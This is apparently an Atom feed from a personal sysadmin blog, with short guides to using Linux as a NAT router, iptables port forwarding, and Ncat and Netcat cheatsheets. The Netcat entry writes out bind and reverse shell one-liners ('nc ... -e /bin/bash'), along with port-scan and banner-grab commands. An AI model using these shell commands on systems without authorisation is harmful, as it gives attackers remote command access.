<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Stuff I Wanna Remember</title><link href="alexcreek.com/" rel="alternate"></link><link href="alexcreek.com/feeds/networking.atom.xml" rel="self"></link><id>alexcreek.com/</id><updated>2014-10-02T00:00:00-04:00</updated><entry><title>Configure Linux as a Router</title><link href="alexcreek.com/configure-linux-as-a-router.html" rel="alternate"></link><updated>2014-10-02T00:00:00-04:00</updated><author><name>alex</name></author><id>tag:,2014-10-02:alexcreek.com/configure-linux-as-a-router.html</id><summary type="html">&lt;p&gt;This guide is for a dual NIC machine.  The machine will use iptable's NAT feature to act as a router/gateway.  This guide does not require editing of the system's routing table.&lt;/p&gt;
&lt;p&gt;1) Enable routing in the kernel&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;sudo vi /etc/sysctl.conf
net.ipv4.ip_forward &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="c1"&gt;# Uncomment this line&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Enable the changes&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;sudo sysctl -p
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;2)  Configure iptables to route packets. Verify that you're configuring the correct interfaces for in/out&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;sudo iptables -t nat -A POSTROUTING --out-interface eth1 -j MASQUERADE
sudo iptables -A FORWARD --in-interface eth0 -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;3)  Write the iptables ruleset to a firewall script or file via iptables-save&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;sudo iptables-save &amp;gt; /etc/firewall.rules
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;4)  Configure the ruleset to load at boot time&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;sudo vi /etc/rc.local
iptables-restore &amp;lt; /etc/firewall.rules  &lt;span class="c1"&gt;# Insert above &amp;#39;exit 0&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;5)  Reboot and verify&lt;/p&gt;</summary></entry><entry><title>Ncat Cheatsheet</title><link href="alexcreek.com/ncat-cheatsheet.html" rel="alternate"></link><updated>2014-10-02T00:00:00-04:00</updated><author><name>alex</name></author><id>tag:,2014-10-02:alexcreek.com/ncat-cheatsheet.html</id><summary type="html">&lt;p&gt;Ncat is a modernized implementation of the classic Netcat (nc) networking tool. The current version of nc, which is 1.10, was initially released in 1996 by "The Hobbit". A lot's changed since '96. Thankfully, the wonderful people at The Nmap Project decided that to solve modern problems you need modern tools, and thus Ncat was created. Ncat picks up where nc left off by implementing features such as IPv6 compatibility, multi-protocol support, built in access control, SSL integration, SOCKS and HTTP proxy support, and even connection brokering for sharing connections between concurrent clients. There is a variety of Netcats that have popped up over time. They include netcat-openbsd, netcat6, socat, and cryptcat, to name a few. Of the various Netcats that exist, I find The Nmap Project's Ncat to be the most comprehensive and the best implementation of the classic TCP/IP Swiss Army Knife.&lt;/p&gt;
&lt;p&gt;Ncat is typically distributed as part of the Nmap Security Scanner. Nmap packages are readily available for most major Linux distros through their respective package managers. However, the recommended method to install Nmap is to visit the Download page at nmap.org and pickup the current version. Nmap's download page offers precompiled rpms, source rpms, Windows installers, separate binaries for nmap, ncat and nping, and of course source code. Note: If nmap/ncat is installed from source, libssl-dev needs to be installed prior to compiling to enable ssl support.&lt;/p&gt;
&lt;p&gt;Netcat's usage has been covered previously, see Netcat tricks, so the following is going to build on that and detail Ncat's additional features. Care has been taken in developing Ncat to keep the options and basic usage the same as nc. A few minor differences between versions exist, the main being the Ncat doesn't include a port scanning function. This is merely trivial as Nmap is able to fulfill any port scanning requirements.&lt;/p&gt;
&lt;h2&gt;Send/recieve a file&lt;/h2&gt;
&lt;p&gt;Server side &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -vl --send-only 7777 &amp;lt; file
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client side &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -v remote_host 7777 &amp;gt; file
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Encrypt a session with SSL&lt;/h2&gt;
&lt;p&gt;Server side &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -vl --ssl 7777 &amp;lt; file
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client side &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -v --ssl 7777 &amp;gt; file
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Connect to an HTTPS website&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -v --ssl google.com 443
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Forward a local port&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -vl &lt;span class="m"&gt;7777&lt;/span&gt; -c &lt;span class="s1"&gt;&amp;#39;ncat remote_host 8080&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Connect through a proxy&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat --proxy proxy_server:port --proxy-type {socks4|http} remot_host port [--proxy-auth username:password]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Proxies that return status code 407 require authentication&lt;/p&gt;
&lt;h2&gt;Create an HTTP proxy&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -vl --proxy-type http 7777 [--allow 123.45.67.89 --proxy-auth user:pass]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Configure access controls for listening sockets&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;ncat -vl 7777 {--allow|--deny}  remotehost
ncat -vl 7777 {--allow|--deny}  10.0.0.10
ncat -vl 7777 {--allow|--deny}  10.0.0.10,10.0.0.20
ncat -vl 7777 {--allow|--deny}  10.0.0.10-20
ncat -vl 7777 {--allow|--deny}  10.0.0.0/24
ncat -vl 7777 {--allow-file|--deny-file} hosts.txt
&lt;/pre&gt;&lt;/div&gt;</summary></entry><entry><title>Netcat Cheatsheet</title><link href="alexcreek.com/netcat-cheatsheet.html" rel="alternate"></link><updated>2014-10-02T00:00:00-04:00</updated><author><name>alex</name></author><id>tag:,2014-10-02:alexcreek.com/netcat-cheatsheet.html</id><summary type="html">&lt;h2&gt;Open a socket&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -vlp port
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Send file to client&lt;/h2&gt;
&lt;p&gt;Server side, opens a socket and closes it once file is transferred&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -vlp port -q 0 &amp;lt; file.send
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client side&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -v server port &amp;gt; file.receive
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Send file to server&lt;/h2&gt;
&lt;p&gt;Server side, opens a socket and waits to receive a file&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -vlp port &amp;gt; file.recieve
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client side, sends file to server&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -vq 0 server port &amp;lt; file.send
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Monitor file transfer speeds using pv&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;pv&lt;/code&gt; does not need to be used by both client &amp;amp; server, this is for demonstration purposes only&lt;/p&gt;
&lt;p&gt;Server side, pipe input through pv to monitor transfer speeds&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;cat file.send | pv | nc -vlp port
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client side, pipe ouput through pv to monitor transfer speeds&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -v server port | pv | cat &amp;gt; file.recieve
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Remote shell&lt;/h2&gt;
&lt;p&gt;Server side&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -vlp port -e /bin/bash
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client side&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -v server port
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Reverse shell&lt;/h2&gt;
&lt;p&gt;Listener&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -vlp port
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client side&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -v listener port -e /bin/bash
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Port scan&lt;/h2&gt;
&lt;p&gt;Scans ports 20-30 with -vv for verbose output&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;nc -vv -z hostname 20-30
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Grab banner from server&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;echo &amp;quot;&amp;quot; | nc -vw 1 hostname 22
&lt;/pre&gt;&lt;/div&gt;</summary></entry><entry><title>Port Forwarding with iptables</title><link href="alexcreek.com/port-forwarding-with-iptables.html" rel="alternate"></link><updated>2014-10-02T00:00:00-04:00</updated><author><name>alex</name></author><id>tag:,2014-10-02:alexcreek.com/port-forwarding-with-iptables.html</id><summary type="html">&lt;p&gt;Configuring a port forward with iptables takes 2 rules, a PREROUTING rule and a FORWARD rule. The heavy lifting is accomplished by the PREROUTING rule on the nat table. The FORWARD rule simply allows traffic across the FORWARD chain on the filter table.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;iptables -A PREROUTING -t nat -i [external_iface] -p [proto] --dport [external_port] -j DNAT --to [internal_ip]:[internal_port]
iptables -A FORWARD -p [proto] -d [internal_ip] --dport [internal_port] -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The FORWARD rule isn't necessarily necessary, but if the default policy for the FORWARD chain on the filter table is DROP, then the port forward won't work without the second rule.&lt;/p&gt;</summary></entry></feed>
